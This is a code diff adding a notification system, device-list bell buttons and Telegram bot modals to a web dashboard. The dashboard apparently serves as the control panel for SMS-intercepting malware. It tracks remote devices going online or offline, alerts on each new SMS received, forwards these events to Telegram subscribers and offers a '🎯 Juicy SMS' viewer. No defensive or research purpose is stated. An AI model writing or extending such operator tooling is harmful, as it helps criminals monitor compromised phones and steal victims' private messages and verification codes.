+let _notifUnread    = 0;
+let _notifAllEntries = [];
+let _notifDropOpen  = false;
+const _NOTIF_POLL_MS = 30000; // poll every 30s
+
+async function fetchNotifications(since) {
+  const url = since ? `/api/notifications?limit=50&since=${encodeURIComponent(since)}` : '/api/notifications?limit=50';
+  const res = await fetch(url);
+  return await res.json();
+}
+
+async function _pollNotifications() {
+  try {
+    // Full fetch to refresh list
+    const data = await fetchNotifications();
+    const entries = data.entries || [];
+    // Count new entries since last seen
+    const newest = entries[0]?.ts || null;
+    if (_notifLastSeen && newest && newest > _notifLastSeen) {
+      const newOnes = entries.filter(e => e.ts > _notifLastSeen);
+      _notifUnread += newOnes.length;
+      _showToast(newOnes);
+    }
+    _notifAllEntries = entries;
+    _renderNotifList();
+    _updateNotifBadge();
+  } catch {}
+}
+
+function _updateNotifBadge() {
+  const badge = document.getElementById('notif-badge');
+  if (!badge) return;
+  if (_notifUnread > 0) {
+    badge.textContent = _notifUnread > 99 ? '99+' : _notifUnread;
+    badge.classList.remove('hidden');
+  } else {
+    badge.classList.add('hidden');
+  }
+}
+
+function _renderNotifList() {
+  const list = document.getElementById('notif-list');
+  if (!list) return;
+  if (!_notifAllEntries.length) {
+    list.innerHTML = '<div class="notif-empty">No alerts sent yet</div>';
+    return;
+  }
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const typeIcon = t => t === 'device_online' ? '🟢' : t === 'device_offline' ? '🔴' : '📩';
+  const typeLabel = t => t === 'device_online' ? 'Online' : t === 'device_offline' ? 'Offline' : 'New SMS';
+  const relTime = ts => {
+    const diff = Date.now() - new Date(ts).getTime();
+    if (diff < 60000) return 'just now';
+    if (diff < 3600000) return `${Math.floor(diff/60000)}m ago`;
+    if (diff < 86400000) return `${Math.floor(diff/3600000)}h ago`;
+    return new Date(ts).toLocaleDateString();
+  };
+  list.innerHTML = _notifAllEntries.map(e => `
+    <div class="notif-item">
+      <div class="ni-top">
+        <span class="ni-type">${typeIcon(e.type)} ${typeLabel(e.type)} — <code style="font-size:10px">${esc(e.deviceId?.slice(0,12))}…</code></span>
+        <span class="ni-ts">${relTime(e.ts)}</span>
+      </div>
+      <div class="ni-text">${esc(e.botName)} · ${e.urlSet?.toUpperCase()} · ${e.chatCount} subscriber(s)</div>
+    </div>`).join('');
+}
+
+function toggleNotifDropdown() {
+  _notifDropOpen = !_notifDropOpen;
+  const dd = document.getElementById('notif-dropdown');
+  if (_notifDropOpen) {
+    dd.classList.add('open');
+    // Mark all as read
+    _notifLastSeen = _notifAllEntries[0]?.ts || _notifLastSeen;
+    _notifUnread = 0;
+    _updateNotifBadge();
+    _renderNotifList();
+  } else {
+    dd.classList.remove('open');
+  }
+}
+
+// Close dropdown when clicking outside
+document.addEventListener('click', e => {
+  if (_notifDropOpen && !e.target.closest('#notif-bell-btn') && !e.target.closest('#notif-dropdown')) {
+    _notifDropOpen = false;
+    document.getElementById('notif-dropdown').classList.remove('open');
+  }
+});
+
+async function clearNotifications() {
+  await fetch('/api/notifications', { method: 'DELETE' });
+  _notifAllEntries = [];
+  _notifUnread = 0;
+  _notifLastSeen = null;
+  _renderNotifList();
+  _updateNotifBadge();
+}
+
+let _toastTimer = null;
+function _showToast(newEntries) {
+  const toast = document.getElementById('notif-toast');
+  if (!toast) return;
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const typeIcon = t => t === 'device_online' ? '🟢' : t === 'device_offline' ? '🔴' : '📩';
+  if (newEntries.length === 1) {
+    const e = newEntries[0];
+    toast.innerHTML = `${typeIcon(e.type)} <b>${esc(e.botName)}</b> — ${esc(e.deviceId?.slice(0,14))} (${e.urlSet?.toUpperCase()})`;
+  } else {
+    toast.innerHTML = `🔔 <b>${newEntries.length} new alert(s)</b> sent to Telegram`;
+  }
+  toast.classList.add('show');
+  if (_toastTimer) clearTimeout(_toastTimer);
+  _toastTimer = setTimeout(() => { toast.classList.remove('show'); }, 5000);
+}
+
+// Initial load + start polling
+_pollNotifications();
+setInterval(_pollNotifications, _NOTIF_POLL_MS);
+
+// ── Integration: wrap openUrl to load alert configs ───────────────────────────
+const _origOpenUrl = openUrl;openUrl = async function(id) {
+  await _origOpenUrl.call(this, id);
+  loadAlertConfigsForUrlSet();
+};
+
+// ── Integration: wrap renderDevices to add bell icons ────────────────────────
+if (typeof renderDevices === 'function') {
+  const _origRenderDevices = renderDevices;
+  renderDevices = function(...args) {
+    _origRenderDevices.apply(this, args);
+    // After render completes, append bell buttons to each row's last <td>
+    document.querySelectorAll('#device-tbody tr').forEach((row, idx) => {
+      const lastTd = row.querySelector('td:last-child');
+      if (!lastTd || lastTd.querySelector('.bell-btn')) return;
+      const deviceId = currentDevices[idx]?.deviceId;
+      const brand    = currentDevices[idx]?.brand || 'Unknown';
+      if (!deviceId) return;
+      const btn = document.createElement('button');
+      btn.className = 'bell-btn' + (currentAlertConfigs[deviceId] ? ' active' : '');
+      btn.dataset.deviceId = deviceId;
+      btn.title = currentAlertConfigs[deviceId] ? 'Alert configured' : 'No alert configured';
+      btn.textContent = '🔔';
+      btn.onclick = () => openAlertModal(deviceId, brand);
+      lastTd.appendChild(btn);
+    });
+  };
+}
+</script>
+
+<!-- ── Juicy SMS Modal ── -->
+<div class="modal-overlay" id="juicysms-modal" onclick="if(event.target===this)closeJuicySms()">
+  <div class="modal-box" style="max-width:700px">
+    <button class="modal-close" onclick="closeJuicySms()">✕ Close</button>
+    <h3 id="juicysms-title">🎯 Juicy SMS</h3>
+    <div id="juicysms-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
+  </div>
+</div>
+
+<!-- ── Notification Toast ── -->
+<div id="notif-toast"></div>
+
+<!-- ── Telegram Bot Setup Modal ── -->
+<div class="modal-overlay" id="telegram-setup-modal" onclick="if(event.target===this)closeTelegramSetup()">
+  <div class="modal-box" style="max-width:520px">
+    <button class="modal-close" onclick="closeTelegramSetup()">✕ Close</button>
+    <h3>🤖 Telegram Bots</h3>
+    <p style="font-size:0.85rem;color:var(--muted);margin-bottom:12px">
+      Create a bot via @BotFather on Telegram, copy the token, and paste it below.
+    </p>
+    <div id="bot-list" style="margin-bottom:16px;min-height:24px"></div>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div>
+        <input id="new-bot-name" type="text" placeholder="Bot Name" maxlength="100"
+               class="sim-edit-input" style="width:100%;box-sizing:border-box" />
+        <div class="field-error" id="bot-name-error">Bot name is required.</div>
+      </div>
+      <div>
+        <input id="new-bot-token" type="text" placeholder="Bot Token (from BotFather)" maxlength="200"
+               class="sim-edit-input" style="width:100%;box-sizing:border-box" />
+        <div class="field-error" id="bot-token-error">Bot token is required.</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button class="btn" onclick="addBot()">➕ Add Bot</button>
+        <span id="bot-form-status" style="font-size:0.85rem;color:var(--red)"></span>
+      </div>
+    </div>
+
+    <!-- Broadcast section -->
+    <div style="margin-top:18px;border-top:1px solid var(--border);padding-top:14px">
+      <h4 style="font-size:0.9rem;margin-bottom:8px">📢 Broadcast to All Subscribers</h4>
+      <p style="font-size:0.8rem;color:var(--muted);margin-bottom:8px">
+        Sends a message to every chat ID that has ever messaged the selected bot.
+      </p>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <select id="broadcast-bot-select"
+                style="width:100%;padding:6px;box-sizing:border-box;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text)">
+          <option value="" disabled selected>— Select a bot —</option>
+        </select>
+        <textarea id="broadcast-message" rows="3"
+                  placeholder="Message to broadcast…"
+                  style="width:100%;box-sizing:border-box;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:6px 10px;font-size:13px;resize:vertical"></textarea>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn" onclick="broadcastToSubscribers()">📤 Send Broadcast</button>
+          <span id="broadcast-status" style="font-size:0.85rem;color:var(--muted)"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Telegram Alert Config Modal ── -->
+<div class="modal-overlay" id="telegram-alert-modal" onclick="if(event.target===this)closeAlertModal()">
+  <div class="modal-box" style="max-width:480px">
+    <button class="modal-close" onclick="closeAlertModal()">✕ Close</button>
+    <h3>🔔 Configure Alert</h3>
+    <p id="alert-modal-device-heading" style="font-size:0.9rem;color:var(--muted);margin-bottom:14px"></p>
+    <div style="margin-bottom:10px">
+      <label style="font-size:0.85rem;display:block;margin-bottom:4px">Bot</label>
+      <select id="alert-bot-select" style="width:100%;padding:6px;box-sizing:border-box;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text)">
+        <option value="" disabled selected>— Select a bot —</option>
+      </select>
+      <div class="field-error" id="alert-bot-error">Please select a bot.</div>
+      <div id="alert-subscriber-info" style="font-size:0.8rem;color:var(--muted);margin-top:4px"></div>
+    </div>
+    <div style="margin-bottom:14px">
+      <label style="font-size:0.85rem;display:block;margin-bottom:6px">Triggers</label>
+      <div class="trigger-group">
+        <label><input type="checkbox" id="trigger-online"  value="device_online"  /> Device comes online</label>
+        <label><input type="checkbox" id="trigger-offline" value="device_offline" /> Device goes offline</label>
+        <label><input type="checkbox" id="trigger-sms"     value="new_sms"        /> New SMS received</label>
+      </div>
+      <div class="field-error" id="alert-trigger-error">Select at least one trigger.</div>
+    </div>
+    <p style="font-size:0.8rem;color:var(--muted);margin-bottom:12px">
+      📡 Alerts will be sent to <b>all subscribers</b> of the selected bot (everyone who has sent a message to it).
+    </p>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <button class="btn" onclick="saveAlert()">💾 Save Alert</button>
+      <button class="btn btn-ghost" id="remove-alert-btn" onclick="removeAlert()" disabled>🗑 Remove Alert</button>
+      <button class="btn btn-ghost" onclick="closeAlertModal()">Cancel</button>
+    </div>
+    <div id="alert-modal-status" style="font-size:0.85rem;color:var(--red);margin-top:8px"></div>
+  </div>
+</div>
+
+</body>
+</html>
